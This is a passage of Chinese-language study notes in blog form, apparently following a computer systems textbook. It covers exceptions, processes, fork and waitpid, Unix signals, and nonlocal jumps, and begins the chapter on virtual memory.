alt="image-20210615171950006"></p><p><strong>异常</strong>类似于过程调用，但也有一些不同之处：</p><ul><li>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中。然而，根据异常的类型，返回地址要么是当前指令（当事件发生时正在执行的指令），要么是下一条描指令（如果事件不发生，将会在当前指令后执行的指令）。</li><li>处理器也把一些额外的处理器状态压到栈里，在处理程序返回时，重新开始被中断的程序会需要这些状态。比如，一个IA32系统将包含当前条件码和其他内容的EFLAGS寄存器压人栈中。</li><li>如果控制从一个用户程序转移到内核，那么所有这些项目都被压到内核栈中，而不是压到用户栈中。</li><li>异常处理程序运行在内核模式下(见8.2.4节)，这意味着它们对所有的系统资源都有完全的访问权限。</li></ul><h4 id="8-1-2-异常的类别"><a href="#8-1-2-异常的类别" class="headerlink" title="8.1.2 异常的类别"></a>8.1.2 异常的类别</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615172726725.png" alt="image-20210615172726725"></p><h5 id="1-中断"><a href="#1-中断" class="headerlink" title="1.中断"></a>1.中断</h5><p>中断是异步发生的，是来自处理器外部的I/O设备的信号的结果。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615172954970.png" alt="image-20210615172954970"></p><h5 id="2-陷阱和系统调用"><a href="#2-陷阱和系统调用" class="headerlink" title="2.陷阱和系统调用"></a>2.陷阱和系统调用</h5><p>陷阱是有意的异常，是执行一条指令的结果。</p><p>陷阱<strong>最重要的用途</strong>是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong>。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615173310199.png" alt="image-20210615173310199"></p><p><strong>系统调用和普通的函数调用</strong>实现非常不同：</p><ul><li>普通的函数运行在用户模式(user mode)中，用户模式<br>限制了函数可以执行的指令的类型，而且它们只能访问与调用函数相同的栈。</li><li>系统调用运行在内核模式(kernel mode)中，内核模式允许系统调用执行指令，并访问定义在内核中的栈。</li></ul><h5 id="3-故障"><a href="#3-故障" class="headerlink" title="3.故障"></a>3.故障</h5><p>故障由错误情况引起，它可能能够被故障处理程序修正。当故障发生时，处理器将控制转移给故障处理程序。如果处理程序能够修正这个错误情况，它就将控制返回到引起故障的指令，从而重新执行它。否则，处理程序返回到内核中的 abort例程， abort例程会终止引起故障的应用程序。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615173712103.png" alt="image-20210615173712103"></p><h5 id="4-终止"><a href="#4-终止" class="headerlink" title="4.终止"></a>4.终止</h5><p>终止是不可恢复的致命错误造成的结果，通常是一些硬件错误，比如DRAM或者SRAM位被损坏时发生的奇偶错误。终止处理程序从不将控制返回给应用程序。如图8-8所示，处理程序将控制返回给一个 abort例程，该例程会终止这个应用程序。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615173835444.png" alt="image-20210615173835444"></p><h4 id="8-1-3-Linux-IA32系统中的异常"><a href="#8-1-3-Linux-IA32系统中的异常" class="headerlink" title="8.1.3 Linux/IA32系统中的异常"></a>8.1.3 Linux/IA32系统中的异常</h4><h5 id="1-Linux-IA32故障和终止"><a href="#1-Linux-IA32故障和终止" class="headerlink" title="1.Linux/IA32故障和终止"></a>1.Linux/IA32故障和终止</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615174044372.png" alt="image-20210615174044372"></p><h5 id="2-Linux-IA32系统调用"><a href="#2-Linux-IA32系统调用" class="headerlink" title="2.Linux/IA32系统调用"></a>2.Linux/IA32系统调用</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615174116950.png" alt="image-20210615174116950"></p><hr><h3 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h3><p><strong>进程</strong>的经典定义就是一个执行中的程序的实例。系统中的每个程序都是运行在某个进程的上下文( context)中的。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在存储器中的程序的代码和数据、它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。</p><p>进程提供给应用程序两个<strong>关键抽象</strong>：</p><ul><li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占地使用处理器。</li><li>一个私有的地址空间，它提供一个假象，好像我们的程序独占地使用存储器系统。</li></ul><h4 id="8-2-1-逻辑控制流"><a href="#8-2-1-逻辑控制流" class="headerlink" title="8.2.1 逻辑控制流"></a>8.2.1 逻辑控制流</h4><p><strong>逻辑控制流</strong>提供一个假象，好像我们的程序在独占地使用处理器。如果想用调试器单步执行程序，我们会看到一系列的程序计数器(PC)的值，这些值唯一地对应于包含在程序的可执行目标文件中的指令，或者是包含在运行时动态链接到程序的共享对象中的指令。这个PC值的序列叫做<strong>逻辑控制流</strong>，或者简称逻辑流。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615190649412.png" alt="image-20210615190649412"></p><h4 id="8-2-2-并发流"><a href="#8-2-2-并发流" class="headerlink" title="8.2.2 并发流"></a>8.2.2 并发流</h4><p><strong>并发流</strong>：一个逻辑流的执行在时间上与另一个流重叠。更准确地说，流Ⅹ和Y互相并发，当且仅当X在Y开始之后和Y结束之前开始，或者Y在X开始之后和X结束之前开始。</p><p><strong>并发：</strong>多个流并发地执行的一般现象</p><p><strong>多任务：</strong>一个进程和其他进程轮流运行的概念</p><p><strong>时间片：</strong>一个进程执行它的控制流的一部分的每一时间叫做时间片，多任务也叫作时间分片。</p><p><strong>并行流：</strong>两个流并发的运行在不同的处理器核或者计算机上，它们并行地运行，且并行地执行</p><h4 id="8-2-3-私有地址空间"><a href="#8-2-3-私有地址空间" class="headerlink" title="8.2.3 私有地址空间"></a>8.2.3 私有地址空间</h4><p>进程也为每个程序提供一种假象，好像它独占地使用系统地址空间。</p><p>一个进程为每个程序提供它自己的私有地址空间。一般而言，和这个空间中某个地址相关联的那个存储器字节是不能被其他进程读或者写的，从这个意义上说，这个地址空间是私有的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210622073331434.png" alt="image-20210622073331434"></p><h4 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h4><p>通过模式位来控制</p><p><strong>内核模式：</strong>设置了模式位后，一个运行在内核模式的进程可以执行指令集中的任何指令，并且可以访问系统中任何存储器位置。</p><p><strong>用户模式：</strong>没有设置模式位时，进程就运行在用户模式中。用户模式中的进程不允许执行特权指令(privileged instruction),比如停止处理器、改变模式位，或者发起一个IO操作。也不允许用户模式中的进程直接引用地址空间中内核区内的代码和数据。任何这样的尝试都会导致致命的保护故障。反之，用户程序必须通过系统调用接口间接地访问内核代码和数据。</p><h4 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h4><p>操作系统内核使用一种称为<strong>上下文切换</strong>的较高层形式的异常控制流来实现多任务。</p><p><strong>上下文</strong>就是内核重新启动一个被抢占的进程所需的状态。它由一些对象的值组成，这些对象包括通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈和各种内核数据结构，比如描绘地址空间的页表、包含有关当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。<br>在进程执行的某些时刻，内核可以决定抢占当前进程，并重新开始一个先前被抢占的进程。这种决定就叫做<strong>调度</strong>( schedule),是由内核中称为<strong>调度器</strong>( scheduler)的代码处理的。当内核选择一个新的进程运行时，我们就说内核调度了这个进程。在内核调度了一个新的进程运行后，它就抢占当前进程，并使用一种称为上下文切换的机制来将控制转移到新的进程。</p><p><strong>上下文切换：</strong></p><ol><li><p>保存当前进程的上下文</p></li><li><p>恢复某个先前被抢占的进程被保存的上下文</p></li><li><p>将控制传递给这个新恢复的进程。</p></li></ol><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194036573.png" alt="image-20210615194036573"></p><hr><h3 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h3><p>当Unix系统级函数遇到错误时，它们典型地返回-1,并设置全局整数变量errno来表示什么出错了。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194451811.png" alt="image-20210615194451811"></p><p>简化</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194500771.png" alt="image-20210615194500771"></p><p>再简化</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194519890.png" alt="image-20210615194519890"></p><p>再简化</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615194534416.png" alt="image-20210615194534416"></p><hr><h3 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h3><h4 id="8-4-1-获取进程ID"><a href="#8-4-1-获取进程ID" class="headerlink" title="8.4.1 获取进程ID"></a>8.4.1 获取进程ID</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615200923542.png" alt="image-20210615200923542"></p><h4 id="8-4-2-创建和终止进程"><a href="#8-4-2-创建和终止进程" class="headerlink" title="8.4.2 创建和终止进程"></a>8.4.2 创建和终止进程</h4><p>从程序员的角度，我们可以认为进程总是处于下面三种状态之一：</p><ul><li><p><strong>运行</strong>。进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</p></li><li><p><strong>停止</strong>。进程的执行被挂起( suspend),且不会被调度。当收到 SIGSTOP、 SIGTSTP、SIDTTIN或者 SIGTTOU信号时，进程就停止，并且保持停止直到它收到一个 SIGCONT信号，在这个时刻，进程再次开始运行。</p></li><li><p><strong>终止</strong>。进程永远地停止了。进程会因为三种原因终止：</p><ol><li><p>收到一个信号，该信号的默认行为是终止进程，</p></li><li><p>从主程序返回</p></li><li><p>调用exit函数。</p></li></ol></li></ul><p><strong>子进程（fork函数如何创建）：</strong>新创建的子讲程几乎但不完全与父进程相同。子进程得到与父进程用户级虚拟地址空间相同的（但是独立的）一份拷贝，包括文本、数据和bss段、堆以及用户栈。子进程还获得与父进程任何打开文件描述符相同的拷贝，这就意味着当父进程调用fork时，子进程可以读写父进程中打开的任何文件。父进程和新创建的子进程之间<strong>最大的区别</strong>在于它们有<strong>不同的PID</strong>。</p><p>示例程序：</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615201819338.png" alt="image-20210615201819338"></p><p><strong>fork函数的特点：</strong>调用一次，返回两次一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中，fork返回子进程的<br>PID。在子进程中，fork返回0。因为子进程的PID总是非零的，返回值就提供一个明确的方法来分辨程序是在父进程还是在子进程中执行。</p><p><strong>这个例子（父子进程）的一些特点：</strong></p><ul><li><p><strong>调用一次，返回两次。</strong>fork函数被父进程调用一次，但是却返回两次。一次是返回到父进程，一次是返回到新创建的子进程。</p></li><li><p><strong>并发执行。</strong>父进程和子进程是并发运行的独立进程。内核能够以任意方式交替执行它们的逻辑控制流中的指令。当我们在系统上运行这个程序时，父进程先完成它的 printf语句，然后是子进程。然而，在另一个系统上可能正好相反。一般而言，作为程序员，我们决不能对不同进程中指令的交替执行做任何假设。</p></li><li><p><strong>相同的但是独立的地址空间。</strong>如果能够在fork函数在父进程和子进程中返回后立即暂停这两个进程，我们会看到每个进程的地址空间都是相同的。每个进程有相同的用户栈、相同的本地变量值、相同的堆、相同的全局变量值，以及相同的代码。</p><p>因此，在我们的示例程序中，当fork函数在第8行返回时，本地变量x在父进程和子进程中都为1。然而因为父进程和子进程是独立的进程，它们都有自己的私有地址空间。父进程和子进程对所做的任何改变都是独立的，不会反映在另一个进程的存储器中。这就是为什么当父进程和子进程调用它们各自的 printf语句时，它们中的变量x会有不同的值的原因。</p></li><li><p><strong>共享文件。</strong>当运行这个示例程序时，我们注意到父进程和子进程都把它们的输出显示在屏幕上。原因是子进程继承了父进程所有的打开文件。当父进程调用fork时， stdout文件是被打开的，并指向屏幕。子进程继承了这个文件，因此它的输出也是指向屏幕的。</p></li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615201857583.png" alt="image-20210615201857583"></p><h4 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h4><p><strong>僵死进程：</strong>一个终止了但未被回收的进程</p><p><strong>waitpid函数：</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615203910901.png" alt="image-20210615203910901"></p><p>默认地(当 options=0时)， waitpid<strong>挂起</strong>调用进程的执行，直到它的等待集合中的一个子进程终止。</p><p>如果等待集合中的一个进程在刚调用的时刻就已经终止了，那么 waitpid就立即返回。在这两种情况下， waitpid返回导致 waitpid返回的<strong>已终止子进程的PID</strong>,并且将这个已终止的子进程从系统中去除。</p><ol><li><p><strong>判断等待集合的成员</strong></p><p>等待集合的成员是由参数pid来确定的：</p><ul><li>如果pid&gt;0,那么等待集合就是一个单独的子进程，它的进程D等于pid</li><li>如果pid=-1,那么等待集合就是由父进程所有的子进程组成的。</li></ul></li><li><p><strong>修改默认行为</strong></p><p>可以通过将 options设置为常量 WNOHANG和WUNTIRACED的各种组合，修改默认行为</p><ul><li>**WNOHANG:**如果等待集合中的任何子进程都还没有终止，那么就立即返回（返回值为0)。默认的行为是挂起调用进程，直到有子进程终止。在等待子进程终止的同时，如果还想做些有用的工作，这个选项会有用</li><li>**WUNTRACED:**挂起调用进程的执行，直到等待集合中的一个进程变成已终止或者被停止。返回的PD为导致返回的已终止或被停止子进程的PD。默认的行为是只返回已终止的子进程。当你想要检查已终止和被停止的子进程时，这个选项会有用。</li><li><strong>WNOHANG|WUNTRACED</strong>:立即返回，如果等待集合中没有任何子进程被停止或已终止，那么返回值为0,或者返回值等于那个被停止或者已终止的子进程的PID。</li></ul></li><li><p><strong>检查已回收子进程的退出状态</strong></p><p>如果 status参数是非空的，那么 waitpid就会在 status参数中放上关于导致返回的子进程的状态信息。wait,h头文件定义了解释 status参数的几个宏：</p><ul><li>**WIFEXITED(status)**：如果子进程通过调用exit或者一个返回(return)正常终止，就返回真。</li><li><strong>WEXITSTATUS(status):</strong> 返回一个正常终止的子进程的退出状态。只有在 WIFEXITED返回为真时，才会定义这个状态。</li><li><strong>WIFSIGNALED(status):</strong> 如果子进程是因为一个未被捕获的信号终止的，那么就返回真(将在8.5节中解释说明信号)。</li><li><strong>WTERMSIG(status):</strong> 返回导致子进程终止的信号的数量。只有在 WIFSIGNALED(status)返回为真时，才定义这个状态。</li><li><strong>WIFSTOPPED(status):</strong> 如果引起返回的子进程当前是被停止的，那么就返回真。</li><li>WSTOPSIG(status): 返回引起子进程停止的信号的数量。只有在 WIFSTOPPED(status)返回为真时，才定义这个状态。</li></ul></li><li><p><strong>错误条件</strong></p><p>如果调用进程没有子进程，那么 waitpid返回-1,并且设置 errno为 <strong>ECHILD</strong>。如果waitpid函数被一个信号中断，那么它返回-1,并设置 errno为 <strong>EINTR</strong>。</p></li><li><p>wait<strong>函数</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615205135841.png" alt="image-20210615205135841"></p></li></ol><h4 id="8-4-4-让进程休眠"><a href="#8-4-4-让进程休眠" class="headerlink" title="8.4.4 让进程休眠"></a>8.4.4 让进程休眠</h4><p><strong>sleep函数</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615205249733.png" alt="image-20210615205249733"></p><p><strong>pause函数</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615205335143.png" alt="image-20210615205335143"></p><h4 id="8-4-5-加载并运行程序"><a href="#8-4-5-加载并运行程序" class="headerlink" title="8.4.5 加载并运行程序"></a>8.4.5 加载并运行程序</h4><h4 id="8-4-6-利用fork和execve运行程序"><a href="#8-4-6-利用fork和execve运行程序" class="headerlink" title="8.4.6 利用fork和execve运行程序"></a>8.4.6 利用fork和execve运行程序</h4><hr><h3 id="8-5-信号"><a href="#8-5-信号" class="headerlink" title="8.5 信号"></a>8.5 信号</h3><p><strong>信号</strong>就是一条小消息，它通知进程系统中发射了一个某种类型的事件。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616132126470.png" alt="image-20210616132126470"></p><h4 id="8-5-1-信号术语"><a href="#8-5-1-信号术语" class="headerlink" title="8.5.1 信号术语"></a>8.5.1 信号术语</h4><p>传送一个信号到目的进程是由两个不同步骤组成的：</p><ul><li><strong>发送信号</strong>。内核通过更新目的进程上下文中的某个状态，发送（递送）一个信号给目的进程。发送信号可以有如下两个原因：<ul><li><ol><li>内核检测到一个系统事件，比如被零除错误或者<br>子进程终止。</li></ol></li><li><ol start="2"><li>一个进程调用了kill函数（在下一节中讨论），显式地要求内核发送一个信号给目的进程。一个进程可以发送信号给它自己。</li></ol></li></ul></li><li><strong>接收信号</strong>。当目的进程被内核强迫以某种方式对信号的发送做出反应时，目的进程就接收了信号。进程可以忽略这个信号，终止或者通过执行一个称为信号处理程序（signal handler)的用户层函数捕获这个信号。</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616134151781-1623822116278.png" alt="image-20210616134151781"></p><p><strong>待处理信号（pending signal)：</strong>一个只发出而没有被接收的信号。</p><ul><li><p>在任何时刻，一种类型只会有有一个待处理信号。</p></li><li><p>一个进程可以有选择性地阻塞接受某种信号。当一种信号被阻塞时，它仍可以被发送，但是产生的待处理信号不会被接受，知道进程取消对这种信号的阻塞。</p></li><li><p>一个待处理信号最多被接受一次。</p></li></ul><h4 id="8-5-2-发送信号"><a href="#8-5-2-发送信号" class="headerlink" title="8.5.2 发送信号"></a>8.5.2 发送信号</h4><ol><li><p><strong>进程组</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616135725636.png" alt="image-20210616135725636"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616135744711.png" alt="image-20210616135744711"></p></li><li><p><strong>用/bin/kill程序发送信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616135759238.png" alt="image-20210616135759238"></p></li><li><p><strong>从键盘发送信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616140206513.png" alt="image-20210616140206513"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616140217571.png" alt="image-20210616140217571"></p></li><li><p><strong>用kill函数发送信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616140454210.png" alt="image-20210616140454210"></p></li><li><p><strong>用alarm函数发生信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616141623550.png" alt="image-20210616141623550"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616141648506.png" alt="image-20210616141648506"></p></li></ol><h4 id="8-5-3-接收信号"><a href="#8-5-3-接收信号" class="headerlink" title="8.5.3 接收信号"></a>8.5.3 接收信号</h4><p>当内核从一个异常处理程序返回，准备将控制传递给进程P时，它会检查进程P的未被阻塞的待处理信号的集合( pending&amp;~ blocked)。如果这个集合为空（通常情况下），那么内核将控制传递到p的逻辑控制流中的下一条指令(l<del>next</del>).<br>然而，如果集合是非空的，那么内核选择集合中的某个信号k(通常是最小的k),并且强制P接收信号k。收到这个信号会触发进程的某种行为。一旦进程完成了这个行为，那么控制就传递回P的逻辑控制流中的下一条指令(l<del>next</del>)。</p><p>每个信号类型都有一个预定义的<strong>默认行为</strong>，是下面中的一种：</p><ul><li>进程终止。</li><li>进程终止并转储存储器 (dump core)。</li><li>进程停止直到被 SIGCONT信号重启。</li><li>进程忽略该信号。</li></ul><p><strong>signal函数：</strong></p><p>进程通过使用一个signal函数修改和信号相关联的默认行为</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616143233373.png" alt="image-20210616143233373"></p><p>signal函数可以通过下列三种方法之一来改变和信号 signum相关联的行为：</p><ul><li>如果 handler是SIG_IGN,那么忽略类型为 signum的信号。</li><li>如果 handler是SIG_DFL,那么类型为 signum的信号行为恢复为默认行为。</li><li>否则， handler就是用户定义的函数的地址，这个函数称为<strong>信号处理程序</strong>（ signal handler),只要进程接收到一个类型为 signum的信号，就会调用这个程序。通过把处理程序的地址传递到 signal函数从而改变默认行为，这叫做<strong>设置信号处理程序</strong>（installing the handler)。调用信号处理程序称为<strong>捕获信号</strong>。执行信号处理程序称为<strong>处理信号</strong>。</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616150205507.png" alt="image-20210616150205507"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616150220611.png" alt="image-20210616150220611"></p><h4 id="8-5-4-信号处理问题"><a href="#8-5-4-信号处理问题" class="headerlink" title="8.5.4 信号处理问题"></a>8.5.4 信号处理问题</h4><p>要捕获多个信号的一些问题：</p><ul><li><strong>待处理信号被阻塞</strong>。Unix信号处理程序通常会阻塞当前处理程序正在处理的类型的待处理信号。比如，假设一个进程捕获了一个 SIGINT信号，并且当前正在运行它的 SIGINT处理程序。如果另一个 SIGINT信号传递到这个进程，那么这个 SIGINT将变成待处理的，但是不会被接收，直到处理程序返回。</li><li><strong>待处理信号不会排队等待</strong>。任意类型至多只有一个待处理信号。因此，如果有两个类型为k的信号传送到一个目的进程，而由于目的进程当前正在执行信号k的处理程序，所以信号k是阻塞的，那么第二个信号就被简单地丢弃，它不会排队等待。关键思想是存在一个待处理的信号仅仅表明至少已经有一个信号到达了。</li><li><strong>系统调用可以被中断</strong>。像read、wait和 accept这样的系统调用潜在地会阻塞进程一段较长的时间，称为慢速系统调用。在某些系统中，当处理程序捕获到一个信号时，被中断的慢速系统调用在信号处理程序返回时不再继续，而是立即返回给用户一个错误条件，并将 errno设置为 EINTR。</li></ul><h4 id="8-5-5-可移植的信号处理"><a href="#8-5-5-可移植的信号处理" class="headerlink" title="8.5.5 可移植的信号处理"></a>8.5.5 可移植的信号处理</h4><p>为了处理不同系统之间信号处理语义的差异，可以定义一个包装函数，称为Signal。它的调用方式和signal函数的调用方式一样。</p><p>Signal包装函数设置了一个信号处理程序，其信号处理语义如下：</p><ul><li>只有这个处理程序当前正在处理的那种类型的信号被阻塞</li><li>和所有信号实现一样，信号不会排队等待。</li><li>只要可能，被中断的系统调用会自动重启。</li><li>一旦设置了信号处理程序，它就会一直保持，直到 Signal带着 handler参数为SIG_IGN或者 SIG_DFL被调用。（一些比较老的Unⅸ系统会在一个处理程序处理完一个信号之后，将信号行为恢复为它的默认行为。）</li></ul><h4 id="8-5-6-显示地阻塞和取消阻塞信号"><a href="#8-5-6-显示地阻塞和取消阻塞信号" class="headerlink" title="8.5.6 显示地阻塞和取消阻塞信号"></a>8.5.6 显示地阻塞和取消阻塞信号</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155200810.png" alt="image-20210616155200810"></p><h4 id="8-5-7-同步流以避免讨厌的并发错误"><a href="#8-5-7-同步流以避免讨厌的并发错误" class="headerlink" title="8.5.7 同步流以避免讨厌的并发错误"></a>8.5.7 同步流以避免讨厌的并发错误</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155703781.png" alt="image-20210616155703781"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155808141.png" alt="image-20210616155808141"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155726929.png" alt="image-20210616155726929"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155823683.png" alt="image-20210616155823683"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155903713.png" alt="image-20210616155903713"></p><hr><h3 id="8-6-非本地跳转"><a href="#8-6-非本地跳转" class="headerlink" title="8.6 非本地跳转"></a>8.6 非本地跳转</h3><p><strong>非本地跳转：</strong></p><p>C语言提供了一种用户级异常控制流形式，称为<strong>非本地跳转</strong>( nonlocal jump),它将控制直接从一个函数转移到另一个当前正在执行的函数，而不需要经过正常的调用一返回序列。非本地跳转是通过 setjmp和longjmp函数来提供的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616160043032.png" alt="image-20210616160043032"></p><ul><li><p>非本地跳转的一个重要应用：允许从一个深层嵌套的函数调用中立即返回，通常是由检测到某个错误情况引起的。</p></li><li><p>非本地跳转的另一个重要应用：是使一个信号处理程序分支到一个特殊的代码位置，而不是返回到被信号到达中断了的指令的位置。</p></li></ul><h3 id="8-7-操作进程的工具"><a href="#8-7-操作进程的工具" class="headerlink" title="8.7 操作进程的工具"></a>8.7 操作进程的工具</h3><p>Linux系统提供了大量的监控和操作进程的有用工具：</p><ul><li><strong>STRACE</strong>: 打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。对于好奇的学生而言，这是一个令人着迷的工具。用- static编译你的程序，能得到一个更干净的、不带有大量与共享库相关的输出的轨迹。</li><li><strong>PS</strong>: 列出当前系统中的进程（包括僵死进程）。</li><li><strong>TOP</strong>: 打印出关于当前进程资源使用的信息</li><li><strong>PMAP</strong>: 显示进程的存储器映射。</li><li>/<strong>proc</strong>: 一个虚拟文件系统，以ASCII文本格式输出大量内核数据结构的内容，用户程序可以读取这些内容。比如，输入“cat/proc/loadavg”，观察在Linux系统上当前的平均负载。</li></ul><hr><h2 id="第九章-虚拟存储器"><a href="#第九章-虚拟存储器" class="headerlink" title="第九章 虚拟存储器"></a>第九章 虚拟存储器</h2><h3 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h3><p><strong>物理寻址：</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616173343847.png" alt="image-20210616173343847"></p><p><strong>虚拟寻址：</strong></p><p>使用虚拟寻址时，CPU通过生成一个虚拟地址( Virtual Address,VA)来访问主存，这个虚拟地址在被送到存储器之前先转换成适当的物理地址。将一个虚拟地址转换为物理地址的任务叫做地址翻译(address translation)。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616173400967.png" alt="image-20210616173400967"></p><hr><h3 id="9-2-地址空间"><a href="#9-2-地址空间" class="headerlink" title="9.2 地址空间"></a>9.2 